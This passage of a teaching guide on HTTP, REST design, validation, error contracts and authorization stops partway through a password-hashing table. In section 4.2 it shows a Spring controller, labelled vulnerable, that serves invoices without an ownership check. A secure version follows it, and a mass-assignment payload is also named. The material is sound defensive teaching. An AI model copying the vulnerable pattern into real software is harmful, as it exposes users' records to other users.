# Module 6 — API Engineering & Security

> **Authoritative Curriculum Guide**  
> **Primary Technology Stack:** HTTP/1.1, HTTP/2, HTTP/3, REST, Java 21 LTS, Spring Boot 3.x, Spring Security 6.x, Node.js (v20+ LTS), Express.js, TypeScript 5.x, PostgreSQL/MySQL Integration Patterns  
> **Audience:** Senior Backend Engineers, Systems Architects, Application Security Engineers, Technical Interview Candidates  

---

## Executive Overview & Architectural Foundations

An Application Programming Interface (API) is the contractual boundary between an application's internal domain logic and the untrusted external world. In modern distributed systems, APIs do not merely exchange serialized data packets; they define the **security perimeters, transactional boundaries, operational fault domains, and backward-compatibility invariants** of the enterprise.

Building production-grade APIs requires moving beyond basic CRUD operations. A senior backend engineer and API architect must master:
1. **Protocol Semantics vs. Implementation Behavior:** The precise behavioral contracts of RFC 9110 (HTTP Semantics), separating safety and idempotency from arbitrary framework controller mappings.
2. **Resource-Oriented Modeling:** Designing expressive, intuitive REST interfaces that avoid both the chaos of ad-hoc RPC endpoint sprawl and the over-engineering of pure academic hypermedia.
3. **Rigorous Validation & Defensive Contracts:** Establishing unambiguous trust boundaries where syntactical formats, types, and business constraints are validated before payloads touch domain models, communicating errors via standardized RFC 7807/9457 Problem Details.
4. **Authentication vs. Authorization Mechanics:** Decoupling identity verification (AuthN) from fine-grained policy enforcement (AuthZ), eliminating Broken Object Level Authorization (BOLA/IDOR) through architectural ownership checks.
5. **Modern Token & Identity Architecture:** Navigating the trade-offs of stateful server sessions versus self-contained JWT bearer tokens, executing OAuth 2.0 Authorization Code grants with PKCE, and separating OpenID Connect identity assertion from API authorization.
6. **Framework Security Runtimes:** Mastering the Spring Security 6.x security filter chain, method security, and OAuth2 resource server mechanics in Java 21, as well as Express middleware trust pipelines, helmet security headers, and safe parameterized database access in Node.js/TypeScript.
7. **System Reliability & Concurrency Controls:** Protecting downstream resources using distributed rate limiting algorithms (Token Bucket, Leaky Bucket, Sliding Windows), enforcing atomic idempotency-key lifecycles under concurrent retries, and designing keyset-based cursor pagination immune to offset drift.

This module provides a unified, first-principles guide to API engineering and application security, preparing engineers to architect resilient production APIs and defend complex design choices in high-bar technical interviews.

---

## Table of Contents

- [Section 1 — HTTP Fundamentals for Backend Engineers](#section-1--http-fundamentals-for-backend-engineers)
- [Section 2 — REST Resource Modeling and API Design](#section-2--rest-resource-modeling-and-api-design)
- [Section 3 — Request Validation and Error Contracts](#section-3--request-validation-and-error-contracts)
- [Section 4 — Authentication and Authorization](#section-4--authentication-and-authorization)
- [Section 5 — Session, Cookie, and Token Security](#section-5--session-cookie-and-token-security)
- [Section 6 — JWT, OAuth 2.0, and OpenID Connect](#section-6--jwt-oauth-20-and-openid-connect)
- [Section 7 — Spring Security Implementation](#section-7--spring-security-implementation)
- [Section 8 — Node.js / Express API Security](#section-8--nodejs--express-api-security)
- [Section 9 — API Attack Surfaces and Defenses](#section-9--api-attack-surfaces-and-defenses)
- [Section 10 — CORS, CSRF, XSS, and Browser Security Boundaries](#section-10--cors-csrf-xss-and-browser-security-boundaries)
- [Section 11 — Rate Limiting, Quotas, and Abuse Prevention](#section-11--rate-limiting-quotas-and-abuse-prevention)
- [Section 12 — Idempotency, Retries, and Reliable API Operations](#section-12--idempotency-retries-and-reliable-api-operations)
- [Section 13 — Pagination, Versioning, and API Evolution](#section-13--pagination-versioning-and-api-evolution)
- [Section 14 — API Testing and Security Verification](#section-14--api-testing-and-security-verification)
- [Section 15 — Scenario-Driven Interview Question Bank](#section-15--scenario-driven-interview-question-bank)
- [Section 16 — Module 6 Cheatsheet: API Engineering & Security](#section-16--module-6-cheatsheet-api-engineering--security)

---

## Section 1 — HTTP Fundamentals for Backend Engineers

### 1.1 The HTTP Message Architecture

Hypertext Transfer Protocol (HTTP) is a stateless, application-level, request-response communication protocol standardized by the Internet Engineering Task Force (IETF) in RFC 9110 and RFC 9112. Every HTTP exchange consists of a client request followed by a server response transmitted over a reliable transport connection (typically TCP or QUIC).

#### Anatomy of an HTTP Request
An HTTP/1.1 request message consists of four structural segments separated by Carriage Return Line Feed (`CRLF`, `\r\n`) sequences:

```
[Method] [Request-Target] [HTTP-Version]\r\n       <-- Request Line (Start Line)
[Header-Field-Name]: [Header-Field-Value]\r\n    <-- Header Section
[Header-Field-Name]: [Header-Field-Value]\r\n
\r\n                                              <-- Empty Line (Header Terminator)
[Message Body (Optional Binary/Text Stream)]      <-- Payload Body
```

Realistic raw HTTP request example:
```http
POST /api/v1/orders HTTP/1.1
Host: api.retail.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json; charset=utf-8
Content-Length: 104
Accept: application/json
User-Agent: PaymentCheckoutService/2.4.0
Idempotency-Key: 7b3e2189-9a72-4d08-bc23-649f874982a1

{
  "customerId": "cust_88291",
  "items": [{"productId": "prod_102", "quantity": 2}],
  "currency": "USD"
}
```

#### Anatomy of an HTTP Response
```
[HTTP-Version] [Status-Code] [Reason-Phrase]\r\n   <-- Status Line (Start Line)
[Header-Field-Name]: [Header-Field-Value]\r\n    <-- Header Section
\r\n                                              <-- Empty Line
[Message Body (Optional Stream)]                  <-- Payload Body
```

Realistic raw HTTP response example:
```http
HTTP/1.1 201 Created
Date: Wed, 14 Oct 2026 10:15:30 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 148
Location: /api/v1/orders/ord_99482103
ETag: W/"d41d8cd98f00b204e9800998ecf8427e"
Cache-Control: private, no-cache

{
  "orderId": "ord_99482103",
  "customerId": "cust_88291",
  "status": "PENDING_PAYMENT",
  "totalAmountCents": 9998,
  "createdAt": "2026-10-14T10:15:30Z"
}
```

---

### 1.2 Method Semantics: Safety and Idempotency

HTTP methods are defined by their **intended semantics**, not by how a naive server handler might happen to implement them. The two most fundamental properties of HTTP methods in RFC 9110 are **Safety** and **Idempotency**.

```
+--------+-------+------------+--------------------------------------------------------+
| Method | Safe? | Idempotent | RFC 9110 Defined Primary Semantic Purpose               |
+--------+-------+------------+--------------------------------------------------------+
| GET    | YES   | YES        | Transfer a current representation of target resource.  |
| HEAD   | YES   | YES        | Same as GET, but transfers only headers, no body.      |
| OPTIONS| YES   | YES        | Describe communication options for target resource.    |
| PUT    | NO    | YES        | Create or completely REPLACE target resource state.    |
| DELETE | NO    | YES        | Delete target resource mapping.                        |
| POST   | NO    | NO         | Perform resource-specific processing (append, create). |
| PATCH  | NO    | NO         | Apply PARTIAL modifications to target resource.        |
+--------+-------+------------+--------------------------------------------------------+
```

#### Safety
A method is **safe** if its defined semantics are essentially read-only. Calling a safe method (`GET`, `HEAD`, `OPTIONS`) must not cause any state changes on the server that would affect client resource management. Safe methods allow web crawlers, search indexing spiders, and reverse proxies (like Cloudflare, Varnish, Nginx) to prefetch or repeat requests without asking user consent or risking unintended mutations.

> **Engineering Trap:** Implementing state mutation on `GET` requests (e.g., `GET /api/v1/users/delete?id=10`) is a catastrophic protocol violation. Web accelerators and pre-rendering engines will trigger massive data deletion simply by crawling page links.

#### Idempotency
A method is **idempotent** if the intended effect on the server of multiple identical requests with that method is the same as the effect for a single such request.
- `PUT /users/42` is idempotent: Per RFC 9110 §9.3.4, `PUT` replaces the entire state of the target resource identified by the Request-URI with the enclosed representation. Sending `{ "name": "Alice" }` five times leaves user 42 in the exact same state as sending it once. Any fields omitted in a `PUT` payload are overwritten or reset to defaults.
- `DELETE /orders/99` is idempotent: Sending the request once removes the order (returning 204 or 200). Sending it again finds the order already deleted (returning 404). While the status code changes, the *resulting server state* is identical: the resource remains absent.
- `POST /orders` is non-idempotent: Submitting five identical POST requests will create five distinct orders with five distinct identifiers, charging the user's credit card five times unless an application-level idempotency mechanism intervenes.
- `PATCH /accounts/1` is non-idempotent in the general case: A patch operation instructing `{ "op": "increment", "path": "/balance", "value": 100 }` will add 100 on every invocation.

---

### 1.3 HTTP Status Code Classification and Engineering Semantics

HTTP status codes are 3-digit integers categorized by their first digit:

```
+-------+-------------------+-----------------------------------------------------------+
| Range | Category          | Production Engineering Meaning                            |
+-------+-------------------+-----------------------------------------------------------+
| 1xx   | Informational     | Request received; protocol handshake or streaming ongoing.|
| 2xx   | Successful        | Action was successfully received, understood, and accepted|
| 3xx   | Redirection       | Further action must be taken by client to complete request|
| 4xx   | Client Error      | Client sent invalid request (syntax, auth, missing data). |
| 5xx   | Server Error      | Server encountered failure fulfilling a valid request.    |
+-------+-------------------+-----------------------------------------------------------+
```

#### Critical Status Codes for Backend APIs
- **`200 OK`**: Standard success for requests returning a representation (`GET`, `PUT`, `PATCH`).
- **`201 Created`**: The request succeeded and resulted in the creation of one or more new resources. Per RFC 9110 §15.3.2, the primary created resource is identified by either a `Location` header field in the response or, if omitted, by the effective request URI itself. While providing `Location` is standard and strongly recommended when a new sub-resource URI is allocated, it is not unconditionally mandatory on every valid 201 response.
- **`202 Accepted`**: The request has been accepted for asynchronous processing, but the processing has not completed. Essential for long-running workflows, video encoding, or distributed message publishing. Recommended to include a `Location` header pointing to a status polling endpoint.
- **`204 No Content`**: The request succeeded, and the server fulfilled the action without returning a payload body. Standard for `DELETE` operations and mutation actions.
- **`301 Moved Permanently` vs. `308 Permanent Redirect`**: `301` historically allowed clients to rewrite `POST` to `GET`. `308` strictly requires the client to retain the original HTTP method and body when redirecting.
- **`302 Found` vs. `307 Temporary Redirect`**: Similarly, `302` was rewritten to `GET` by browsers. `307` guarantees method preservation.
- **`400 Bad Request`**: Malformed syntax, invalid JSON framing, or unparseable payload structure.
- **`401 Unauthorized`**: Misnamed in the specification. This represents **Authentication Failure** ("Who are you?"). The client lacks valid authentication credentials. **Requirement:** Must include a `WWW-Authenticate` response header detailing supported authentication schemes (e.g., `WWW-Authenticate: Bearer realm="api"`).
- **`403 Forbidden`**: Represents **Authorization Failure** ("You are identified, but you do not have permission to perform this action on this resource"). Credentials are valid, but the principal lacks sufficient authority. A retry with the same credentials will fail.
- **`404 Not Found`**: The origin server did not find a current representation for the target resource, or the server chooses to conceal the resource's existence from an unauthorized caller.
- **`405 Method Not Allowed`**: The HTTP method is recognized by the server but not supported by the target resource. **Requirement:** Must return an `Allow` header listing permitted methods (e.g., `Allow: GET, HEAD, OPTIONS`).
- **`409 Conflict`**: The request could not be completed due to a conflict with the current state of the target resource (e.g., optimistic lock version mismatch, unique constraint collision, or resource state machine conflict such as attempting to cancel an already-shipped order).
- **`410 Gone`**: The target resource is permanently no longer available at the origin server, and no forwarding address is known. Used for intentional resource retirement and deletion.
- **`412 Precondition Failed`**: One or more conditions given in the request header fields evaluated to false (e.g., an `If-Match: "xyz"` header failed because the entity was modified by another client).
- **`413 Content Too Large`**: The server refuses to process the request because the payload is larger than the server is willing or able to process.
- **`415 Unsupported Media Type`**: The origin server refuses to service the request because the payload format is in an unsupported format (e.g., client sent `application/xml` to an API expecting `application/json`).
- **`422 Unprocessable Content`**: The request syntax is well-formed JSON, but the semantic content contains validation errors (e.g., negative integer for price, invalid date format).
- **`429 Too Many Requests`**: The user has sent too many requests in a given amount of time ("rate limiting"). RFC 6585 specifies that the server `SHOULD` include a `Retry-After` header indicating how many seconds (or an HTTP-date) to wait. Because dynamic rate limiters or cluster routers may omit this header, clients must not assume it is universally present and must implement exponential backoff with full jitter as a fallback.
- **`500 Internal Server Error`**: An unhandled exception or critical bug occurred within the application code.
- **`502 Bad Gateway`**: The server, acting as a gateway or proxy (e.g., Nginx, Envoy, API Gateway), received an invalid response or connection drop from an inbound upstream application service.
- **`503 Service Unavailable`**: The server is currently unable to handle the request due to temporary overload, scheduled maintenance, or exhausted database connection pools. Per RFC 9110 §15.6.4, servers `MAY` send `Retry-After` if recovery time is known, but clients must treat it as optional and apply backoff.
- **`504 Gateway Timeout`**: The gateway or proxy server did not receive a timely response from the upstream application server before its configured read timeout elapsed.

---

### 1.4 Headers and Content Negotiation

Headers provide metadata governing routing, caching, security, and payload parsing.

#### Content-Type vs. Accept
- **`Content-Type`**: Communicates the media type of the payload currently being transmitted in the message body. E.g., `Content-Type: application/json; charset=utf-8`.
- **`Accept`**: Informs the server of the media types the client is capable of processing in the response. Supports **Quality Values (q-factors)** ranging from `0.0` to `1.0`:
  ```http
  Accept: application/json;q=1.0, application/xml;q=0.8, text/plain;q=0.1
  ```
  The server selects the highest priority supported format. If none match, the server returns `406 Not Acceptable`.

#### Conditional Requests and ETags
An **Entity Tag (ETag)** is an opaque validator token assigned by a server to a specific version of a resource:
- **Strong ETag** (`ETag: "686897696a7c876b7e"`): Guarantees byte-for-byte identity of the representation. Mandatory for sub-range requests (`If-Range`) and strong concurrency checks (`If-Match`).
- **Weak ETag** (`ETag: W/"686897696a7c876b7e"`): Prefixed with `W/`. Guarantees semantic equivalence (e.g., JSON key ordering or formatting whitespace may vary, but the underlying entity attributes are equivalent). Per RFC 9110 §8.8.3, weak comparison is valid **only for cache revalidation** (`If-None-Match`). Weak ETags must **never** be used for range requests or strong optimistic lock precondition checks (`If-Match`), as byte-level and transaction-level integrity cannot be assured.

A client caching a resource sends a conditional GET:
```http
GET /api/v1/products/482 HTTP/1.1
If-None-Match: "686897696a7c876b7e"
```
If the server's resource has not changed, the server returns `304 Not Modified` with an empty body, saving bandwidth and serialization compute.

For state mutations, conditional headers prevent the **Lost Update Problem**:
```http
PUT /api/v1/products/482 HTTP/1.1
If-Match: "686897696a7c876b7e"
Content-Type: application/json

{ "priceCents": 1999 }
```
If another transaction updated the product in the interim, its ETag changed. The server detects the mismatch and returns `412 Precondition Failed`, prompting the client to re-fetch and resolve the conflict.

---

### 1.5 Protocol Evolution: HTTP/1.1 vs. HTTP/2 vs. HTTP/3

```
+------------------+-----------------------+---------------------+---------------------+
| Feature          | HTTP/1.1              | HTTP/2              | HTTP/3              |
+------------------+-----------------------+---------------------+---------------------+
| Transport        | TCP                   | TCP + TLS (ALPN)    | QUIC (UDP + TLS 1.3)|
| Framing          | Plaintext textual     | Binary frames       | Binary frames       |
| Concurrency      | Sequential per conn;  | Multiplexed streams | Multiplexed streams |
|                  | connection pools (~6  | over 1 TCP          | over independent    |
|                  | conns/origin in browser) connection         | QUIC streams        |
| Head-of-Line     | Application-level     | TCP-level transport | Transport HoL       |
| Blocking         | (slow response blocks | (dropped TCP packet | eliminated (stream  |
|                  | current connection)   | stalls ALL streams) | packet loss isolated|
| Header Overheads | Redundant plaintext   | HPACK compression   | QPACK compression   |
| Handshake RTT    | 1-RTT TCP + 1-2 TLS   | 1-RTT TCP + 1 TLS   | 1-RTT initial;      |
|                  |                       |                     | 0-RTT resumption    |
| Connection       | IP/Port bound; drops  | IP/Port bound; drops| Connection ID based;|
| Migration        | on network switch     | on network switch   | seamless WiFi/5G    |
+------------------+-----------------------+---------------------+---------------------+
```

#### Head-of-Line (HoL) Blocking and Handshake Dynamics
1. **HTTP/1.1 Concurrency Reality:** Because HTTP/1.1 pipelining suffered from severe intermediary proxy bugs and application-level head-of-line blocking (where a slow response blocks all subsequent responses on that TCP socket), production browsers disabled pipelining and achieved concurrency by opening pools of separate TCP connections (typically up to 6 per origin).
2. **HTTP/2 TCP Transport HoL:** HTTP/2 multiplexes virtual streams over a single TCP connection. However, because TCP enforces a strictly ordered byte stream across the entire connection, a single dropped IP packet stalls delivery of *all* streams until TCP retransmits and acknowledges the missing segment. On lossy mobile networks, HTTP/2 can exhibit higher tail latency than pooled HTTP/1.1.
3. **HTTP/3 QUIC Isolation:** HTTP/3 replaces TCP with QUIC over UDP. Each stream manages its own independent packet sequence and loss recovery; dropped packets on Stream A never stall Stream B.
4. **QUIC 0-RTT Replay Vulnerability:** Initial QUIC connections require 1-RTT (combining transport setup and TLS 1.3 handshake). Resumed connections can transmit 0-RTT early data using pre-shared keys. However, **0-RTT data is vulnerable to network replay attacks** because early data packets lack fresh Diffie-Hellman ephemeral guarantees. Production gateways must strictly forbid non-idempotent state mutations (`POST`) in 0-RTT requests, permitting only safe, idempotent requests (`GET`/`HEAD`).

---

### 1.6 HTTP Is Not Equivalent to REST

A critical interview distinction: **HTTP is a transport/application protocol; REST (Representational State Transfer) is an architectural style.**
- You can build non-RESTful APIs over HTTP: gRPC-Web, SOAP, GraphQL, JSON-RPC.
- REST was formulated by Roy Fielding in his 2000 doctoral dissertation with six core architectural constraints:
  1. **Client-Server Architecture:** Separation of user interface concerns from data storage concerns.
  2. **Statelessness:** No client context is stored on the server between requests; each request contains all information necessary to service it.
  3. **Cacheability:** Responses must implicitly or explicitly define themselves as cacheable or non-cacheable.
  4. **Layered System:** A client cannot tell whether it is connected directly to the end server or an intermediate proxy, load balancer, or CDN.
  5. **Code on Demand (Optional):** Servers can temporarily extend client functionality by transferring executable code (e.g., JavaScript).
  6. **Uniform Interface:** The defining constraint, consisting of resource identification in requests, manipulation through representations, self-descriptive messages, and hypermedia as the engine of application state (HATEOAS).

---

## Section 2 — REST Resource Modeling and API Design

### 2.1 Resources, Representations, and Identifiers

In REST, a **resource** is any conceptual entity that can be named, addressed, and manipulated (e.g., a customer, an order, an invoice). A **representation** is a concrete serialization of that resource state exchanged in a given format (`application/json`, `application/xml`, `text/csv`).

Resource design guidelines:
1. **Use Plural Nouns for Collections:**
   - Preferred: `/api/v1/orders`, `/api/v1/users`, `/api/v1/products`
   - Anti-pattern: `/api/v1/order`, `/api/v1/getAllOrders`, `/api/v1/create_new_order`
2. **Individual Resource Addressing:**
   - `/api/v1/orders/{orderId}` identifies a single order resource.
3. **Sub-Resource Hierarchies and URI Nesting Limits:**
   - Sub-resources represent dependent relationships: `/api/v1/orders/{orderId}/items`
   - **The 2-Level Nesting Rule:** Avoid deeply nested paths like `/api/v1/users/{userId}/organizations/{orgId}/projects/{projectId}/tasks/{taskId}/comments/{commentId}`. Deep nesting binds URIs to transient relational hierarchies. If a resource possesses a globally unique identifier (UUID, Snowflake ID), elevate it to the top level:
     - Preferred: `GET /api/v1/comments/{commentId}`
     - Scoped Query: `GET /api/v1/comments?taskId={taskId}`

```
+------------------------------------+--------+------------------------------------------+
| Endpoint                           | Method | Action Performed                         |
+------------------------------------+--------+------------------------------------------+
| /api/v1/orders                     | GET    | List orders (filtered, paginated).       |
| /api/v1/orders                     | POST   | Create a new order resource.             |
| /api/v1/orders/{id}                | GET    | Retrieve representation of order {id}.   |
| /api/v1/orders/{id}                | PUT    | Replace entire order {id} resource.      |
| /api/v1/orders/{id}                | PATCH  | Partially mutate specific fields of {id}.|
| /api/v1/orders/{id}                | DELETE | Remove order {id}.                       |
| /api/v1/orders/{id}/cancel         | POST   | Execute domain action / state transition.|
+------------------------------------+--------+------------------------------------------+
```

---

### 2.2 Action-Oriented Endpoints vs. RPC Proliferation

While pure REST advocates mapping all state transitions to `PUT` or `PATCH`, real-world enterprise domain models often feature complex state transitions (e.g., cancelling an order, issuing a partial refund, approving an expense report) that carry distinct business invariants, side effects, and authorization rules.

#### When Action Sub-Resources Are Justified
Treating a state transition as a generic field update (`PATCH /orders/123 { "status": "CANCELLED" }`) creates major problems:
- The controller must inspect which specific field changed and trigger side-effects (releasing warehouse inventory, dispatching cancellation emails, revoking payment authorizations).
- Authorization becomes messy: A user might have permission to update their shipping address, but only an automated worker or customer support agent can transition the status to `CANCELLED`.

**The Clean Architectural Pattern:** Model actions as specific sub-resource verbs or operations:
```http
POST /api/v1/orders/{orderId}/cancel HTTP/1.1
Content-Type: application/json

{
  "reason": "Customer found cheaper alternative",
  "restockInventory": true
}
```
This is not an undisciplined RPC sprawl; it is an explicit domain command executed upon a designated resource identity.

---

### 2.3 Partial Updates: PUT vs. PATCH (JSON Merge Patch vs. JSON Patch)

#### PUT Semantics: Full Replacement
`PUT` replaces the entire target resource state with the supplied representation. If an existing order has fields `address`, `items`, and `deliveryNotes`, and a client sends:
```http
PUT /api/v1/orders/101 HTTP/1.1
Content-Type: application/json

{
  "deliveryNotes": "Leave at front door"
}
```
The server is contractually bound to replace the resource. Omitted fields (`address`, `items`) must either be set to their default/null states or the request must be rejected. `PUT` is not a partial update mechanism!

#### PATCH Semantics: Partial Modification
RFC 5789 defines `PATCH` for partial mutations. Two formal standards govern patch formats:

##### 1. JSON Merge Patch (RFC 7396)
The client sends an object containing only the fields to be merged:
```http
PATCH /api/v1/users/42 HTTP/1.1
Content-Type: application/merge-patch+json

{
  "bio": "Senior Systems Architect",
  "phoneNumber": null
}
```
- Keys present with values are updated.
- Keys present with `null` are deleted/cleared.
- Keys omitted remain untouched.
- **Limitation:** Cannot set a field to `null` if the business model distinguishes between "clear field" and "field value is null", nor can it easily append items to arrays without replacing the array.

##### 2. JSON Patch (RFC 6902)
The client sends a sequence of explicit operations evaluated sequentially:
```http
PATCH /api/v1/users/42 HTTP/1.1
Content-Type: application/json-patch+json

[
  { "op": "replace", "path": "/bio", "value": "Senior Systems Architect" },
  { "op": "remove", "path": "/phoneNumber" },
  { "op": "add", "path": "/skills/-", "value": "Rust" },
  { "op": "test", "path": "/version", "value": 3 }
]
```
The `test` operation enables atomic optimistic concurrency: if the target value does not match, the entire patch operation MUST fail. Per RFC 6902 §5, a failed `test` operation is properly reported using `409 Conflict` (when indicating a resource state concurrency conflict) or `422 Unprocessable Content` / `400 Bad Request`. (Note: `412 Precondition Failed` is reserved by RFC 9110 for request-level conditional headers such as `If-Match`).

---

### 2.4 API Versioning Strategies

APIs must evolve without breaking existing mobile clients, web applications, or third-party integrations.

```
+--------------------+----------------------------+-----------------------+-----------------------+
| Strategy           | Concrete Example           | Advantages            | Disadvantages         |
+--------------------+----------------------------+-----------------------+-----------------------+
| URI Path           | /api/v1/orders             | Highly explicit;      | Bumps entire API      |
|                    |                            | trivial routing & CDN | version for change    |
|                    |                            | caching; easy cURL    | on single resource.   |
| Custom Header      | X-API-Version: 2           | Clean URIs; resource  | Harder to test in     |
|                    |                            | identity unchanged.   | browser; requires     |
|                    |                            |                       | Vary header for CDNs. |
| Media Type /       | Accept: application/       | Pure REST compliance; | High developer        |
| Content Negotiation| vnd.company.v2+json        | fine-grained per-type | friction; poor        |
|                    |                            | versioning.           | tooling support.      |
+--------------------+----------------------------+-----------------------+-----------------------+
```

#### Deprecation Lifecycle & Sunset Headers
When retiring an API version, notify consumers programmatically via RFC 8594 `Sunset` and IETF `Deprecation` headers:
```http
HTTP/1.1 200 OK
Deprecation: Wed, 15 Oct 2025 00:00:00 GMT
Sunset: Wed, 11 Nov 2026 00:00:00 GMT
Link: <https://api.example.com/docs/v2-migration>; rel="deprecation"; type="text/html"
```
- **`Sunset` (RFC 8594):** Formatted strictly as an `HTTP-date`. Signals the exact date and time after which the server plans to become permanently unresponsive at this URI.
- **`Deprecation` (IETF draft):** Communicates that the endpoint is deprecated. Specified either as an `HTTP-date` or as a boolean/timestamp depending on the client profile.
- **`Link` Header:** Provides clients and developers with a direct hypermedia link to migration documentation (`rel="deprecation"`).
Monitor API gateway telemetry to identify which client credentials continue invoking deprecated routes before pulling the plug.

---

## Section 3 — Request Validation and Error Contracts

### 3.1 Trust Boundaries & Validation Topology

A backend service must treat all network input as untrusted and potentially hostile. Validation must be tiered across distinct architectural layers:

```
[ Client Request ]
       |
       v
+-------------------------------------------------------------+
| Layer 1: Gateway / Network Boundary                         |
|   - Request Body Size Limits (max-swallow-size)             |
|   - Content-Type Enforcement (application/json)             |
|   - HTTP Method & Character Encoding Invariants             |
+-------------------------------------------------------------+
       |
       v
+-------------------------------------------------------------+
| Layer 2: Syntactical / DTO Schema Validation (HTTP Layer)   |
|   - Jakarta Bean Validation (@Valid, @NotNull, @Size) / Zod |
|   - Type correctness, string lengths, regex formats         |
|   - Unknown field rejection (Mass Assignment Prevention)     |
+-------------------------------------------------------------+
       |
       v
+-------------------------------------------------------------+
| Layer 3: Semantic / Business Logic Validation (Domain Layer)|
|   - Entity existence (Product ID valid in database?)        |
|   - Cross-field rules (EndDate > StartDate)                 |
|   - Resource quota & credit balance checks                  |
|   - State machine transition validity (Is order cancellable?)|
+-------------------------------------------------------------+
       |
       v
[ Database Transaction ]
```

#### Unknown Fields: Strip vs. Reject
- **Stripping unknown fields** silently removes unexpected JSON properties. While forgiving, it can mask client typos (e.g., client sends `customrId` instead of `customerId`, leading to unexpected null defaults).
- **Rejecting unknown fields** (`400 Bad Request`) strictly enforces the contract and stops **Mass Assignment Attacks** (where an attacker injects `{"role": "ADMIN"}` into a user profile update).

---

### 3.2 Standardized Error Responses: RFC 7807 / RFC 9457 Problem Details

Ad-hoc error JSON structures (e.g., `{ "msg": "Error", "code": 500 }`) fragment client error handling. Modern production APIs standardize on **RFC 9457 (Problem Details for HTTP APIs)** (which obsoletes RFC 7807).

#### RFC 9457 Standard Error Representation
```http
HTTP/1.1 400 Bad Request
Content-Type: application/problem+json
Date: Wed, 14 Oct 2026 10:20:00 GMT

{
  "type": "https://api.retail.example.com/errors/invalid-order-payload",
  "title": "Validation Failed",
  "status": 400,
  "detail": "The payload contains 3 semantic validation errors.",
  "instance": "/api/v1/orders",
  "traceId": "c8f293b4-e81a-471a-96df-9828b068da41",
  "timestamp": "2026-10-14T10:20:00.102Z",
  "invalid_parameters": [
    {
      "field": "items[0].quantity",
      "rejectedValue": -2,
      "rule": "Must be greater than 0"
    },
    {
      "field": "currency",
      "rejectedValue": "USD_INVALID",
      "rule": "Must be a valid 3-letter ISO-4217 code"
    }
  ]
}
```

#### Essential Invariants for Error Contracts
1. **Never Leak Stack Traces or SQL Statements:** Exposing `java.lang.NullPointerException` or `org.postgresql.util.PSQLException: relation "users" does not exist` provides attackers with internal table schemas, library versions, and execution paths (CWE-209).
2. **Include Unique Trace/Correlation IDs:** Inject a `traceId` or `X-Request-ID` into every error response and log entry. When a customer reports an issue, support engineers can instantly locate the root cause in distributed trace logs without needing sensitive client data.
3. **Machine-Readable Error Codes:** Clients must not parse localized English strings to make control-flow decisions. Provide stable machine-readable enum codes (`ORDER_ALREADY_FULFILLED`).

---

## Section 4 — Authentication and Authorization

### 4.1 The Fundamental Conceptual Boundary

```
+-----------------------------------------------------------------------------------------+
| AUTHENTICATION (AuthN)                                                                  |
| Core Question: "Who or what are you?"                                                   |
| Mechanism:     Verifying credentials (password, public key signature, biometric, token).|
| Output:        A verified Principal / Identity (e.g., User ID: 9482, Client: PaymentApp)|
| Failure Code:  HTTP 401 Unauthorized (Requires WWW-Authenticate challenge header)       |
+-----------------------------------------------------------------------------------------+
                                           |
                                           v
+-----------------------------------------------------------------------------------------+
| AUTHORIZATION (AuthZ)                                                                   |
| Core Question: "May this authenticated principal perform this action on this resource?" |
| Mechanism:     Evaluating permissions, role memberships, ownership checks, policies.    |
| Output:        Access Decision: ALLOW or DENY.                                          |
| Failure Code:  HTTP 403 Forbidden (Identity confirmed, but operation disallowed)       |
+-----------------------------------------------------------------------------------------+
```

Successful authentication **never** implies authorization. A common failure in junior engineering is checking whether a user is logged in, and then immediately serving whatever resource ID was supplied in the request parameter.

---

### 4.2 Access Control Models: RBAC, ABAC, and BOLA/IDOR Defense

#### Role-Based Access Control (RBAC)
RBAC maps users to roles (`ADMIN`, `OPERATOR`, `CUSTOMER`) and roles to coarse permissions (`orders:read`, `users:delete`).
- *Limitation:* RBAC cannot make contextual decisions based on data ownership. A user with the role `CUSTOMER` has permission to `orders:read`, but they should **only** read *their own* orders!

#### Attribute-Based Access Control (ABAC)
ABAC makes dynamic authorization decisions by evaluating policies against attributes of:
1. **Subject:** User ID, department, security clearance, tenant ID.
2. **Resource:** Owner User ID, tenant ID, classification level, creation date.
3. **Action:** Read, Write, Delete, Approve.
4. **Environment:** Current timestamp, source IP, geographic location, device health status.

#### Broken Object Level Authorization (BOLA / IDOR)
BOLA (historically termed Insecure Direct Object Reference) is the **#1 vulnerability in the OWASP API Security Top 10**.

**The Vulnerable Implementation:**
```java
// VULNERABLE: Direct object access without ownership validation!
@GetMapping("/api/v1/invoices/{invoiceId}")
public InvoiceResponse getInvoice(@PathVariable Long invoiceId) {
    // Fetches invoice directly by PK. Any logged-in user can change invoiceId in URL
    // and download every competitor's confidential invoices!
    return invoiceRepository.findById(invoiceId)
        .map(this::toResponse)
        .orElseThrow(() -> new ResourceNotFoundException());
}
```

**The Secure Implementation (Defense in Depth):**
```java
// SECURE: Object-level ownership check combined with multi-tenant scoping
@GetMapping("/api/v1/invoices/{invoiceId}")
public InvoiceResponse getInvoice(
    @PathVariable Long invoiceId,
    @AuthenticationPrincipal UserPrincipal principal
) {
    Invoice invoice = invoiceRepository.findByIdAndTenantId(invoiceId, principal.getTenantId())
        .orElseThrow(() -> new ResourceNotFoundException("Invoice not found"));

    // Verify object ownership unless principal possesses global auditor privileges
    if (!invoice.getOwnerUserId().equals(principal.getUserId()) && 
        !principal.hasAuthority("ROLE_TENANT_AUDITOR")) {
        // Return 404 or 403. 404 prevents leaking the existence of other users' IDs.
        throw new AccessDeniedException("Unauthorized access to object " + invoiceId);
    }

    return toResponse(invoice);
}
```

---

### 4.3 Password Storage: Cryptographic Hashing vs. Encryption

A frequent interview trap: *"We encrypt user passwords in the database using AES-256."*  
**This is an immediate red flag.**

- **Encryption is Two-Way:** Encryption requires a decryption key. If an attacker gains server read access (via SSRF, SQL Injection, or file traversal), they obtain both the ciphertext and the key, instantly exposing every user's plaintext password.
- **Password Hashing is One-Way:** Cryptographic password hashing transforms a password into an irreversible digest. Verification works by hashing the candidate password submitted during login and comparing the resulting digest.

```
+----------------+---------------+------------------+------------------------------------+
| Algorithm      | Category      | Memory-Hard?     | Current Industry Standing          |
+----------------+---------------+------------------+------------------------------------+
| MD5 / SHA-1    | Cryptographic | NO (Fast)        | BROKEN. Trivial collision and GPU  |
|                | Hash          |                  | brute-force attacks; never use.    |
| SHA-256/SHA-512| Cryptographic | NO (Fast)        | INSUFFICIENT for passwords alone.  |
|                | Hash          |                  | Designed for rapid data integrity. |
